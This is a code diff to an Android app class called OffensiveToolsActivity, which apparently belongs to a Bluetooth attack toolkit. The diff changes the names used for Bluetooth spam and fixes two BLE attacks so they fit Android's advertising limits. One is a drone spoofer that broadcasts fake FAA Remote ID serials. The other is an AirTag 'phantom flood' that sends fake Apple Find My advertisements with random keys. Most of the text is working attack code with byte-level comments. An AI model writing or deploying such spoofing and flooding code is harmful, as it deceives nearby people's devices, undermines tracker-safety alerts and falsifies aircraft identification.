@@ -62,17 +62,18 @@ class OffensiveToolsActivity : Activity() {
     )
 
     // Bee-themed spam names (BEE SPAM exclusive)
+    // ASCII only, max 20 chars. Emoji break setName on many Android versions.
     private val beeSwarmNames = listOf(
-        "\uD83D\uDC1D Worker Bee #1", "\uD83D\uDC1D Worker Bee #2", "\uD83D\uDC1D Worker Bee #3",
-        "\uD83D\uDC1D Drone Bee", "\uD83D\uDC1D Scout Bee", "\uD83D\uDC1D Guard Bee",
-        "\uD83D\uDC1D Queen's Guard", "\uD83D\uDC1D Honey Maker", "\uD83D\uDC1D Pollen Carrier",
-        "\uD83D\uDC1D Wax Builder", "\uD83D\uDC1D Hive Inspector", "\uD83D\uDC1D Royal Jelly",
-        "\uD83D\uDC1D Stinger Unit", "\uD83D\uDC1D Nectar Ops", "\uD83D\uDC1D Swarm Leader",
-        "\uD83D\uDC1D Larva-01", "\uD83D\uDC1D Comb Cell #7", "\uD83D\uDC1D Waggle Dance",
-        "\uD83D\uDC1D Propolis Agent", "\uD83D\uDC1D Forager Alpha", "\uD83D\uDC1D Nurse Bee",
-        "\uD83D\uDC1D Undertaker Bee", "\uD83D\uDC1D nyanBEE HQ", "\uD83D\uDC1D BZZT BZZT",
-        "\uD83C\uDF6F Honeycomb Net", "\uD83C\uDF6F Sweet Sting", "\uD83C\uDF6F Apiary Node",
-        "\uD83D\uDC1D CK42X SWARM", "\uD83D\uDC1D BEE HOUND", "\uD83D\uDC1D THE HIVE SEES"
+        "[BEE] Worker #1", "[BEE] Worker #2", "[BEE] Worker #3",
+        "[BEE] Drone", "[BEE] Scout", "[BEE] Guard",
+        "[BEE] Queen Guard", "[BEE] Honey Maker", "[BEE] Pollen Run",
+        "[BEE] Wax Builder", "[BEE] Inspector", "[BEE] Royal Jelly",
+        "[BEE] Stinger", "[BEE] Nectar Ops", "[BEE] Swarm Lead",
+        "[BEE] Larva-01", "[BEE] Comb Cell 7", "[BEE] Waggle",
+        "[BEE] Propolis", "[BEE] Forager", "[BEE] Nurse",
+        "[BEE] Undertaker", "nyanBEE HQ", "BZZT BZZT",
+        "Honeycomb Net", "Sweet Sting", "Apiary Node",
+        "CK42X SWARM", "BEE HOUND", "THE HIVE SEES"
     )
 
     // Samsung/Google Fast Pair model IDs for Sour Droid
@@ -698,6 +699,10 @@ class OffensiveToolsActivity : Activity() {
     }
 
     // ─── DRONE SPOOFER ───
+    // Uses standard BLE advertising (not promiscuous mode). No root needed.
+    // Real FAA Remote ID drones broadcast over BLE 4 Legacy Advertising.
+    // ASTM F3411 uses service UUID 0xFFFA. Keep service data under 20 bytes
+    // to fit within Android's 31-byte BLE ad limit.
     private fun startDroneSpoofer() {
         val runnable = object : Runnable {
             override fun run() {
@@ -706,13 +711,16 @@ class OffensiveToolsActivity : Activity() {
                 val rand = java.util.Random()
                 val droneType = droneTypes.random()
 
-                val remoteIdData = ByteArray(25)
-                remoteIdData[0] = 0x00
-                remoteIdData[1] = 0x01
+                // Compact Remote ID: msg type + ID type + 10-byte serial
+                // Total: 12 bytes service data (fits within BLE ad limits)
+                val remoteIdData = ByteArray(12)
+                remoteIdData[0] = 0x00  // Message type 0 = Basic ID
+                remoteIdData[1] = 0x01  // ID type 1 = Serial Number
 
-                val serial = "SPOOF${rand.nextInt(99999)}${rand.nextInt(99999)}"
+                // Short random serial (10 chars ASCII)
+                val serial = "SP${rand.nextInt(9999)}${rand.nextInt(9999)}"
                 val serialBytes = serial.toByteArray(Charsets.US_ASCII)
-                System.arraycopy(serialBytes, 0, remoteIdData, 2, minOf(serialBytes.size, 20))
+                System.arraycopy(serialBytes, 0, remoteIdData, 2, minOf(serialBytes.size, 10))
 
                 val remoteIdUuid = android.os.ParcelUuid.fromString("0000FFFA-0000-1000-8000-00805F9B34FB")
 
@@ -735,6 +743,9 @@ class OffensiveToolsActivity : Activity() {
     }
 
     // ─── PHANTOM FLOOD (AirTag Spam) ───
+    // Android BLE ad max payload: 31 bytes total (including AD structure overhead)
+    // Manufacturer data: 2 bytes company ID + payload bytes + 2 bytes AD header = max ~24 payload bytes
+    // Keep payload under 22 bytes to be safe across all Android versions
     private fun startPhantomFlood() {
         val runnable = object : Runnable {
             override fun run() {
@@ -742,15 +753,18 @@ class OffensiveToolsActivity : Activity() {
 
                 val rand = java.util.Random()
 
-                val payload = ByteArray(29)
-                payload[0] = 0x12
-                payload[1] = 0x19
-                payload[2] = 0x10
-                for (i in 3 until 25) payload[i] = rand.nextInt(256).toByte()
-                payload[25] = rand.nextInt(4).toByte()
-                payload[26] = rand.nextInt(256).toByte()
-                payload[27] = rand.nextInt(256).toByte()
-                payload[28] = rand.nextInt(256).toByte()
+                // Minimal Find My payload (type 0x12)
+                // Matches real AirTag ad structure but with random keys
+                val payload = ByteArray(19)
+                payload[0] = 0x12           // Continuity type: Find My
+                payload[1] = 0x02           // Length
+                payload[2] = 0x10           // Status: separated
+                // 6 bytes of random "public key" fragment (enough to look unique)
+                for (i in 3 until 9) payload[i] = rand.nextInt(256).toByte()
+                // Hint byte
+                payload[9] = rand.nextInt(4).toByte()
+                // Remaining random padding
+                for (i in 10 until 19) payload[i] = rand.nextInt(256).toByte()
 
                 val data = BleAdvertiseHelper.buildManufacturerData(0x004C, payload)
                 safeAdvertise(data)
